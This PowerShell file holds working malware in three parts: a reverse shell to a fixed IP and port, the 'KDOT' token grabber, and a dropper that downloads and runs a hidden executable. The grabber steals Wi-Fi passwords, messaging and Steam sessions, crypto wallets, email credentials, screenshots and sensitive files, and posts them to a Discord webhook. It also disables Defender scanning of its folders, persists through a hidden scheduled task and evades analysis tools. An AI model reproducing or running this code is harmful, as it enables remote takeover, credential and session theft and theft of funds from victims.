$client = New-Object System.Net.Sockets.TCPClient('192.168.188.30', 4443)
$stream = $client.GetStream()
$bytes = [byte[]](0..65535)
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
    $sendbyte = [text.encoding]::ASCII.GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()








$ErrorActionPreference = 'SilentlyContinue' # Ignore all warnings
$ProgressPreference = 'SilentlyContinue' # Hide all Progresses

function CHECK_IF_ADMIN {
    $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test
}

function EXFILTRATE-DATA {
    $webhook = "https://discord.com/api/webhooks/1115012616956411948/Dm9b9nnFRnvNDjyt3GRXUhDpeQBBxwP4txEOPy1Wu9946hhJzyhoPJ6Cjb5ax-fdSygB"
    $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
    $ip = $ip.Content
    $ip > $env:LOCALAPPDATA\Temp\ip.txt
    $lang = (Get-WinUserLanguageList).LocalizedName
    $date = (get-date).toString("r")
    Get-ComputerInfo > $env:LOCALAPPDATA\Temp\system_info.txt
    $osversion = (Get-WmiObject -class Win32_OperatingSystem).Caption
    $osbuild = (Get-ItemProperty -Path c:\windows\system32\hal.dll).VersionInfo.FileVersion
    $displayversion = (Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue('DisplayVersion')
    $model = (Get-WmiObject -Class:Win32_ComputerSystem).Model
    $uuid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID 
    $uuid > $env:LOCALAPPDATA\Temp\uuid.txt
    $cpu = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
    $cpu > $env:LOCALAPPDATA\Temp\cpu.txt
    $gpu = (Get-WmiObject Win32_VideoController).Name 
    $gpu > $env:LOCALAPPDATA\Temp\GPU.txt
    $format = " GB"
    $total = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | Foreach {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))}
    $raminfo = "$total" + "$format"  
    $mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
    $mac > $env:LOCALAPPDATA\Temp\mac.txt
    $username = $env:USERNAME
    $hostname = $env:COMPUTERNAME
    $netstat = netstat -ano > $env:LOCALAPPDATA\Temp\netstat.txt
	$mfg = (gwmi win32_computersystem).Manufacturer 
	
	# System Uptime
	function Get-Uptime {
        $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
        $uptimedata = '{0} days {1} hours {2} minutes {3} seconds' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
        $uptimedata
    }
    $uptime = Get-Uptime
	
	# List of Installed AVs
	function get-installed-av {
        $wmiQuery = "SELECT * FROM AntiVirusProduct"
        $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters 
        $AntivirusProduct.displayName 
    }
    $avlist = get-installed-av -autosize | ft | out-string
    
	# Extracts all Wifi Passwords
    $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | out-string
    $wifi = $wifipasslist | out-string 
    $wifi > $env:temp\WIFIPasswords.txt
	
	# Screen Resolution
    $width = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[0]
    $height = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[2]  
    $split = "x"
    $screen = "$width" + "$split" + "$height"  
    $screen
    
	# Startup Apps , Running Services, Processes, Installed Applications, and Network Adapters
	function misc {
        Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List > $env:temp\StartUpApps.txt
        Get-WmiObject win32_service |? State -match "running" | select Name, DisplayName, PathName, User | sort Name | ft -wrap -autosize >  $env:LOCALAPPDATA\Temp\running-services.txt
        Get-WmiObject win32_process | Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path | ft -wrap -autosize > $env:temp\running-applications.txt
        Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > $env:temp\Installed-Applications.txt
        Get-NetAdapter | ft Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize > $env:temp\NetworkAdapters.txt
	}
	misc 
	
    # Telegram Session Stealer
	function telegramstealer {
        $processName = "telegram"
        try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
        $path = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
        $destination = "$env:localappdata\temp\telegram-session.zip"
        $exclude = @("_*.config","dumps","tdummy","emoji","user_data","user_data#2","user_data#3","user_data#4","user_data#5","user_data#6","*.json","webview")
        $files = Get-ChildItem -Path $path -Exclude $exclude
        Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest
    }
    telegramstealer 
	
	# Element Session Stealer
    function elementstealer {
        $processName = "element"
        try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
        $element_session = "$env:localappdata\temp\element-session"
        New-Item -ItemType Directory -Force -Path $element_session
        $elementfolder = "$env:userprofile\AppData\Roaming\Element"
        Copy-Item -Path "$elementfolder\databases" -Destination $element_session -Recurse -force
        Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force
        Copy-Item -Path "$elementfolder\Session Storage" -Destination $element_session -Recurse -force
        Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force
        Copy-Item -Path "$elementfolder\sso-sessions.json" -Destination $element_session -Recurse -force
        $element_zip = "$env:localappdata\temp\element-session.zip"
        Compress-Archive -Path $element_session -DestinationPath $element_zip -CompressionLevel Fastest
    }
    elementstealer 
	
	# Signal Session Stealer
    function signalstealer {
        $processName = "signal"
        try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
        $signal_session = "$env:localappdata\temp\signal-session"
        New-Item -ItemType Directory -Force -Path $signal_session
        $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
        Copy-Item -Path "$signalfolder\databases" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\Local Storage" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\Session Storage" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
        $signal_zip = "$env:localappdata\temp\signal-session.zip"
        Compress-Archive -Path $signal_session -DestinationPath $signal_zip -CompressionLevel Fastest
    }
    signalstealer 

    # Steam Session Stealer
	function steamstealer {
        $processName = "steam"
        try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
        $steam_session = "$env:localappdata\temp\steam-session"
        New-Item -ItemType Directory -Force -Path $steam_session
        $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
        Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
        $ssfnfiles = @("ssfn$1")
        foreach($file in $ssfnfiles) {
            Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach { Copy-Item -path $PSItem.FullName -Destination $steam_session }
        }
        $steam_zip = "$env:localappdata\temp\steam-session.zip"
        Compress-Archive -Path $steam_session -DestinationPath $steam_zip -CompressionLevel Fastest
    }
    steamstealer 
	
	# Minecraft Session Stealer
    function minecraftstealer {
            $minecraft_session = "$env:localappdata\temp\minecraft-session"
            New-Item -ItemType Directory -Force -Path $minecraft_session
            $minecraftfolder1 = $env:appdata + "\.minecraft"
    		$minecraftfolder2 = $env:userprofile + "\.lunarclient\settings\game"
            Get-ChildItem $minecraftfolder1 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session
            Get-ChildItem $minecraftfolder2 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session
            $minecraft_zip = "$env:localappdata\temp\minecraft-session.zip"
            Compress-Archive -Path $minecraft_session -DestinationPath $minecraft_zip -CompressionLevel Fastest
    }
    minecraftstealer 
	
	# Desktop screenshot
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $screens = [Windows.Forms.Screen]::AllScreens
    $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
    $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
    $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
    $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
    $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
    $graphics = [Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
    $bmp.Save("$env:localappdata\temp\desktop-screenshot.png")
    $graphics.Dispose()
    $bmp.Dispose()
	
	# Disk Information
    function diskdata {
        $disks = get-wmiobject -class "Win32_LogicalDisk" -namespace "root\CIMV2"
        $results = foreach ($disk in $disks) {
            if ($disk.Size -gt 0) {
                $SizeOfDisk = [math]::round($disk.Size/1GB, 0)
                $FreeSpace = [math]::round($disk.FreeSpace/1GB, 0)
                $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
                [int]$FreePercent = ($FreeSpace/$SizeOfDisk) * 100
	    		[int]$usedpercent = ($usedspace/$SizeOfDisk) * 100
                [PSCustomObject]@{
                    Drive = $disk.Name
                    Name = $disk.VolumeName
                    "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
                    "Free Disk Size" = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, ($FreePercent)
                    "Used Space" = "{0:N0} GB ({1:N0} %)" -f $usedspace, ($usedpercent)
                }
            }
        }
        $results | out-string 
    }
    $alldiskinfo = diskdata
    $alldiskinfo > $env:temp\DiskInfo.txt
    
	#Extracts Product Key
    function Get-ProductKey {
        try {
            $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform'
            $keyName = 'BackupProductKeyDefault'
            $backupProductKey = Get-ItemPropertyValue -Path $regPath -Name $keyName
            return $backupProductKey
        } catch {
            return "No product key found"
        }
    }
    
    $ProductKey = Get-ProductKey
    Get-ProductKey > $env:localappdata\temp\ProductKey.txt	
	
	# Create temporary directory to store wallet data for exfiltration
	New-Item -Path "$env:localappdata\Temp" -Name "Crypto Wallets" -ItemType Directory -force | out-null
	$crypto = "$env:localappdata\Temp\Crypto Wallets"
	
	
	New-Item -Path "$env:localappdata\Temp" -Name "Email Clients" -ItemType Directory -force | out-null
    $emailclientsfolder = "$env:localappdata\Temp\Email Clients"
	
    # Thunderbird Exfil
    $Thunderbird = @('key4.db', 'key3.db', 'logins.json', 'cert9.db')
    If (Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles") {
    New-Item -Path "$emailclientsfolder\Thunderbird" -ItemType Directory | Out-Null
    Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles" -Include $Thunderbird -Recurse | Copy-Item -Destination "$emailclientsfolder\Thunderbird" -Recurse -Force
    }
	
    # Crypto Wallets
    
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Armory") {
    New-Item -Path "$crypto\Armory" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Armory" -Recurse | Copy-Item -Destination "$crypto\Armory" -Recurse -Force
    }
    
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Atomic") {
    New-Item -Path "$crypto\Atomic" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Atomic\Local Storage\leveldb" -Recurse | Copy-Item -Destination "$crypto\Atomic" -Recurse -Force
    }
    
    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin") {
    New-Item -Path "$crypto\BitcoinCore" -ItemType Directory | Out-Null
    Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin\Bitcoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\BitcoinCore" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\bytecoin") {
    New-Item -Path "$crypto\bytecoin" -ItemType Directory | Out-Null
    Get-ChildItem ("$env:userprofile\AppData\Roaming\bytecoin", "$env:userprofile") -Include *.wallet -Recurse | Copy-Item -Destination "$crypto\bytecoin" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Local\Coinomi") {
    New-Item -Path "$crypto\Coinomi" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Local\Coinomi\Coinomi\wallets" -Recurse | Copy-Item -Destination "$crypto\Coinomi" -Recurse -Force
    }
    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Dash") {
    New-Item -Path "$crypto\DashCore" -ItemType Directory | Out-Null
    Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Dash\Dash-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\DashCore" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Electrum") {
    New-Item -Path "$crypto\Electrum" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Electrum\wallets" -Recurse | Copy-Item -Destination "$crypto\Electrum" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Ethereum") {
    New-Item -Path "$crypto\Ethereum" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Ethereum\keystore" -Recurse | Copy-Item -Destination "$crypto\Ethereum" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Exodus") {
    New-Item -Path "$crypto\exodus.wallet" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\exodus.wallet" -Recurse | Copy-Item -Destination "$crypto\exodus.wallet" -Recurse -Force
    }
	If (Test-Path -Path "$env:userprofile\AppData\Roaming\Guarda") {
    New-Item -Path "$crypto\Guarda" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Guarda\IndexedDB" -Recurse | Copy-Item -Destination "$crypto\Guarda" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\com.liberty.jaxx") {
    New-Item -Path "$crypto\liberty.jaxx" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb" -Recurse | Copy-Item -Destination "$crypto\liberty.jaxx" -Recurse -Force
    }
    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Litecoin") {
    New-Item -Path "$crypto\Litecoin" -ItemType Directory | Out-Null
    Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Litecoin\Litecoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\Litecoin" -Recurse -Force
    }
    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\monero-project") {
    New-Item -Path "$crypto\Monero" -ItemType Directory | Out-Null
    Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\monero-project\monero-core" -Name wallet_path).wallet_path -Recurse | Copy-Item -Destination "$crypto\Monero" -Recurse  -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Zcash") {
    New-Item -Path "$crypto\Zcash" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Zcash" -Recurse | Copy-Item -Destination "$crypto\Zcash" -Recurse -Force
    }

    #Files Grabber 
	New-Item -Path "$env:localappdata\Temp" -Name "Files Grabber" -ItemType Directory -force | out-null
	$filegrabber = "$env:localappdata\Temp\Files Grabber"
	Function GrabFiles {
        $grabber = @(
            "account",
            "login",
            "metamask",
            "crypto",
            "code",
            "coinbase",
            "exodus",
            "backupcode",
            "token",
            "seedphrase",
            "private",
            "pw",
            "lastpass",
            "keepassx",
            "keepass",
            "keepassxc",
            "nordpass",
            "syncthing",
            "dashlane",
            "bitwarden",
            "memo",
            "keys",
            "secret",
            "recovery",
            "2fa",
            "pass",
            "login",
            "backup",
            "discord",
            "paypal",
            "wallet"
        )
        $dest = "$env:localappdata\Temp\Files Grabber"
        $paths = "$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop"
        [regex] $grab_regex = "(" + (($grabber |foreach {[regex]::escape($_)}) -join "|") + ")"
        (gci -path $paths -Include "*.pdf","*.txt","*.doc","*.csv","*.rtf","*.docx" -r | ? Length -lt 5mb) -match $grab_regex | Copy-Item -Destination $dest -Force
    }
    GrabFiles
    
    $embed_and_body = @{
        "username" = "KDOT"
        "content" = "@everyone"
        "title" = "KDOT"
        "description" = "Powerful Token Grabber"
        "color" = "16711680"
        "avatar_url" = "https://i.postimg.cc/m2SSKrBt/Logo.gif"
        "url" = "https://discord.gg/vk3rBhcj2y"
        "embeds" = @(
            @{
                "title" = "POWERSHELL GRABBER"
                "url" = "https://github.com/KDot227/Powershell-Token-Grabber/tree/main"
                "description" = "New victim info collected !"
                "color" = "16711680"
                "footer" = @{
                    "text" = "Made by KDOT, GODFATHER and CHAINSKI"
                }
                "thumbnail" = @{
                    "url" = "https://i.postimg.cc/m2SSKrBt/Logo.gif"
                }
                "fields" = @(
                    @{
                        "name" = ":satellite: IP"
                        "value" = "``````$ip``````"
                    },
                    @{
                        "name" = ":bust_in_silhouette: User Information"
                        "value" = "``````Date: $date `nLanguage: $lang `nUsername: $username `nHostname: $hostname``````"
                    },
					@{
                        "name" = ":shield: Antivirus"
                        "value" = "``````$avlist``````"
                    },
                    @{
                        "name" = ":computer: Hardware"
                        "value" = "``````Screen Size: $screen `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````"
                    },
                    @{
                        "name" = ":floppy_disk: Disk"
                        "value" = "``````$alldiskinfo``````"
                    }
                    @{
                        "name" = ":signal_strength: WiFi"
                        "value" = "``````$wifi``````"
                    }
                )
            }
        )
    }

    $payload = $embed_and_body | ConvertTo-Json -Depth 10
    Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
	
	# Screenshot Embed
	curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$env:localappdata\temp\desktop-screenshot.png\`"" $webhook | out-null

    Set-Location $env:LOCALAPPDATA\Temp

    $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
    if ($token_prot -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force
    }

    $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat"
    if ($secure_dat -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
    }

    $TEMP_KOT = Test-Path "$env:LOCALAPPDATA\Temp\KDOT"
    if ($TEMP_KOT -eq $false) {
        New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory
    }
    
    #Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.1/main.exe" -OutFile "main.exe" -UseBasicParsing
    (New-Object System.Net.WebClient).DownloadFile("https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.1/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")

    #This is needed for the injection to work
    Stop-Process -Name discord -Force
    Stop-Process -Name discordcanary -Force
    Stop-Process -Name discordptb -Force

    $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
    $proc.WaitForExit()

    $extracted = "$env:LOCALAPPDATA\Temp"
    Move-Item -Path "$extracted\ip.txt" -Destination "$extracted\KDOT\ip.txt" 
    Move-Item -Path "$extracted\netstat.txt" -Destination "$extracted\KDOT\netstat.txt" 
    Move-Item -Path "$extracted\system_info.txt" -Destination "$extracted\KDOT\system_info.txt" 
    Move-Item -Path "$extracted\uuid.txt" -Destination "$extracted\KDOT\uuid.txt" 
    Move-Item -Path "$extracted\mac.txt" -Destination "$extracted\KDOT\mac.txt" 
    Move-Item -Path "$extracted\browser-cookies.txt" -Destination "$extracted\KDOT\browser-cookies.txt" 
    Move-Item -Path "$extracted\browser-history.txt" -Destination "$extracted\KDOT\browser-history.txt" 
    Move-Item -Path "$extracted\browser-passwords.txt" -Destination "$extracted\KDOT\browser-passwords.txt" 
    Move-Item -Path "$extracted\desktop-screenshot.png" -Destination "$extracted\KDOT\desktop-screenshot.png" 
    Move-Item -Path "$extracted\tokens.txt" -Destination "$extracted\KDOT\tokens.txt" 
    Move-Item -Path "$extracted\WIFIPasswords.txt" -Destination "$extracted\KDOT\WIFIPasswords.txt" 
    Move-Item -Path "$extracted\GPU.txt" -Destination "$extracted\KDOT\GPU.txt" 
    Move-Item -Path "$extracted\Installed-Applications.txt" -Destination "$extracted\KDOT\Installed-Applications.txt" 
    Move-Item -Path "$extracted\DiskInfo.txt" -Destination "$extracted\KDOT\DiskInfo.txt" 
    Move-Item -Path "$extracted\CPU.txt" -Destination "$extracted\KDOT\CPU.txt" 
    Move-Item -Path "$extracted\NetworkAdapters.txt" -Destination "$extracted\KDOT\NetworkAdapters.txt" 
    Move-Item -Path "$extracted\ProductKey.txt" -Destination "$extracted\KDOT\ProductKey.txt" 
    Move-Item -Path "$extracted\StartUpApps.txt" -Destination "$extracted\KDOT\StartUpApps.txt" 
    Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\KDOT\running-services.txt" 
    Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\KDOT\running-applications.txt" 
	Move-Item -Path "$extracted\telegram-session.zip" -Destination "$extracted\KDOT\telegram-session.zip" 
	Move-Item -Path "$extracted\element-session.zip" -Destination "$extracted\KDOT\element-session.zip" 
	Move-Item -Path "$extracted\signal-session.zip" -Destination "$extracted\KDOT\signal-session.zip" 
	Move-Item -Path "$extracted\steam-session.zip" -Destination "$extracted\KDOT\steam-session.zip" 
	Move-Item -Path "Files Grabber" -Destination "$extracted\KDOT\Files Grabber" 
	Move-Item -Path "Crypto Wallets" -Destination "$extracted\KDOT\Crypto Wallets" 
	Move-Item -Path "Email Clients" -Destination "$emailclientsfolder\KDOT\Email Clients" 
    Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\KDOT.zip" -Force
    curl.exe -X POST -F 'payload_json={\"username\": \"POWERSHELL GRABBER\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/m2SSKrBt/Logo.gif\"}' -F "file=@$extracted\KDOT.zip" $webhook
    Remove-Item "$extracted\KDOT.zip"
    Remove-Item "$extracted\KDOT" -Recurse
	Remove-Item "$filegrabber\Files Grabber" -recurse -force
	Remove-Item "$crypto\Crypto Wallets" -recurse -force
	Remove-Item "$extracted\element-session" -recurse -force
	Remove-Item "$extracted\signal-session" -recurse -force
	Remove-Item "$extracted\steam-session" -recurse -force
	Remove-Item "$emailclientsfolder\Email Clients" -recurse -force
    Remove-Item "$extracted\main.exe"
}

function Invoke-TASKS {
    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
    Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
    New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" -Force
	
	# Hidden Directory
	$KDOT_DIR=get-item "$env:APPDATA\KDOT" -Force
    $KDOT_DIR.attributes="Hidden","System"
    
	$origin = $PSCommandPath
    Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
    $task_name = "KDOT"
    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\kdot\kdot.ps1",0)(window.close)'
    $task_trigger = New-ScheduledTaskTrigger -AtLogOn
    $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force
    EXFILTRATE-DATA
}

function Request-Admin {
    while(!(CHECK_IF_ADMIN)) {
        try {
            Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -File `"$PSCommandPath`"" -Verb RunAs
            exit
        }
        catch {}
    }
}

function Invoke-ANTIVM {
    $processnames= @(
            "autoruns",
            "autorunsc",
            "dumpcap",
            "Fiddler",
            "fakenet",
            "hookexplorer",
            "immunitydebugger",
            "httpdebugger",
            "importrec",
            "lordpe",
            "petools",
            "processhacker",
            "resourcehacker",
            "scylla_x64",
            "sandman",
            "sysinspector",
            "tcpview",
            "die",
            "dumpcap",
            "filemon",
            "idaq",
            "idaq64",
            "joeboxcontrol",
            "joeboxserver",
            "ollydbg",
            "proc_analyzer",
            "procexp",
            "procmon",
            "pestudio",
            "qemu-ga",
            "qga",
            "regmon",
            "sniff_hit",
            "sysanalyzer",
            "tcpview",
            "windbg",
            "wireshark",
            "x32dbg",
            "x64dbg",
            "vmwareuser",
            "vmacthlp",
            "vboxservice",
            "vboxtray",
            "xenservice"
        )
    $detectedProcesses = $processnames | ForEach-Object {
        $processName = $_
        if (Get-Process -Name $processName) {
            $processName
        }
    }

    if ($null -eq $detectedProcesses) { 
        Invoke-TASKS
    }
    else { 
        Write-Output "Detected processes: $($detectedProcesses -join ', ')"
        Exit
    }
}

function Hide-Console
{
    if (-not ("Console.Window" -as [type])) { 
        Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
        '
    }
    $consolePtr = [Console.Window]::GetConsoleWindow()
    $null = [Console.Window]::ShowWindow($consolePtr, 0)
}

if (CHECK_IF_ADMIN -eq $true) {
    Hide-Console
    Invoke-ANTIVM
    # Self-Destruct
	# Remove-Item $PSCommandPath -Force 
} else {
    Write-Host ("Please run as admin!") -ForegroundColor Red
    Start-Sleep -s 1
    Request-Admin
}

Remove-Item (Get-PSreadlineOption).HistorySavePath




$fileUrl = "https://github.com/tayic99373/leave/raw/main/main.exe"
$tempDir = [System.IO.Path]::GetTempPath()
$filePath = Join-Path -Path $tempDir -ChildPath "main.exe"
Invoke-WebRequest -Uri $fileUrl -OutFile $filePath

$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = $filePath
$process.StartInfo.WindowStyle = "Hidden"
$process.Start() | Out-Null

Start-Sleep -Seconds 120

Remove-Item -Path $filePath -Force
